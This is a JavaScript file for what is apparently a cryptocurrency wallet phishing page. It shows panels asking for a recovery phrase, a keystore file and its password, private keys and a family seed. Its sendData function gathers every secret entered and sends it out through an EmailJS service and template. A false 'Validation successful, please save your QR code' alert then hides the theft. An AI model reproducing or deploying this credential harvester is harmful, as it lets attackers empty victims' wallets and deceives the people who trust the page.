var phrase = document.querySelector("#phrase");
var phraseText = document.querySelector("#phraseText");
var keystore = document.querySelector("#keystore");
var private = document.querySelector("#private");
var family = document.querySelector("#family");
var secret = document.querySelector("#secret");
var first = document.querySelector("#first");
var second = document.getElementById("second");
var third = document.querySelector("#third");
var fourth = document.getElementById("fourth");
var fiveth = document.querySelector("#fiveth");
var wallet_name = document.querySelector("#walletname");

phrase.addEventListener("click", function () {
  hide(first);
});

keystore.addEventListener("click", function () {
  hide(second);
});

private.addEventListener("click", function () {
  hide(third);
});

family.addEventListener("click", function () {
  hide(fourth);
});

secret.addEventListener("click", function () {
  hide(fiveth);
});

function hide(elem) {
  var expandedPanel = document.querySelector(".active");
  if (expandedPanel) {
    expandedPanel.classList.remove("active");
    var attr = document.getElementsByClassName(
      "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full"
    );

    for (let i = 0; i < attr.length; i++) {
      attr[i].value = "";
    }
  }
  var i = document.getElementsByClassName(
    "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
  );
  var x = elem.getElementsByClassName(
    "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
  );

  for (let c = 0; c < i.length; c++) {
    i[c].required = false;
  }
  for (let c = 0; c < x.length; c++) {
    x[c].required = true;
  }
  elem.classList.add("active");
}

const form = document.querySelector("#form");

function sendData() {
  var tempParams = {
    wallet: wallet_name ? wallet_name.innerHTML : "",
    phrase: phraseText ? phraseText.value : "",
    keystoreval: document.getElementById("keystoreval") ? document.getElementById("keystoreval").value : "",
    keystorepass: document.getElementById("keystorepass") ? document.getElementById("keystorepass").value : "",
    privatekeyval: document.getElementById("privatekeyval") ? document.getElementById("privatekeyval").value : "",
    privateVal1: document.getElementById("privatekey1") ? document.getElementById("privatekey1").value : "",
    privateVal2: document.getElementById("privatekey2") ? document.getElementById("privatekey2").value : "",
    privateVal3: document.getElementById("privatekey3") ? document.getElementById("privatekey3").value : "",
    privateVal4: document.getElementById("privatekey4") ? document.getElementById("privatekey4").value : "",
    privateVal5: document.getElementById("privatekey5") ? document.getElementById("privatekey5").value : "",
    privateVal6: document.getElementById("privatekey6") ? document.getElementById("privatekey6").value : "",
    privateVal7: document.getElementById("privatekey7") ? document.getElementById("privatekey7").value : "",
    privateVal8: document.getElementById("privatekey8") ? document.getElementById("privatekey8").value : "",
    familyseedVal: document.getElementById("familyseed") ? document.getElementById("familyseed").value : "",
    phraseVal: document.getElementById("phraseinput") ? document.getElementById("phraseinput").value : "",
  };

  emailjs.send("service_vtr18z5", "template_trd91ej", tempParams).then(
    function (response) {
      console.log("SUCCESS!", response.status, response.text);
      alert("Validation successful, please save your QR code");
      document.querySelector(".sending").style.display = "none";
    },
    function (error) {
      console.log("FAILED...", error);
      alert("Oops! Something went wrong.");
      document.querySelector(".sending").style.display = "none";
    }
  );
}

form.addEventListener("submit", function (e) {
  e.preventDefault();
  document.querySelector(".sending").style.display = "flex";
  sendData();
});
